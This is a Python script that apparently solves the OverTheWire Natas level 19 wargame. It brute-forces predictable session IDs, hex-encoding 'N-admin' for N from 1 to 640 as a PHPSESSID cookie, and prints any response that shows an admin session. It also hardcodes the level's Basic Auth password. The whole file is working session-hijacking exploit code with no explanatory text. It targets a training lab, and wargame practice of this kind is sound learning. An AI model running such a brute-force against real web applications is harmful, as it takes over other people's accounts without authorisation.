import requests
import string
from requests.auth import HTTPBasicAuth
def string_to_hex(s):
    return ''.join(format(ord(c), '02x') for c in s)
basicAuth=HTTPBasicAuth('natas19','tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
sz = 641
url = "http://natas19.natas.labs.overthewire.org/index.php?debug"
for i in range(1,sz):
    atmp = string_to_hex(str(i)+'-admin')
    phpsessid = "PHPSESSID="+atmp
    head = {'Cookie':phpsessid}
    r = requests.get(url,headers=head,auth = basicAuth)
    if "regular user" not in r.text:
        print(i)
        print(r.text)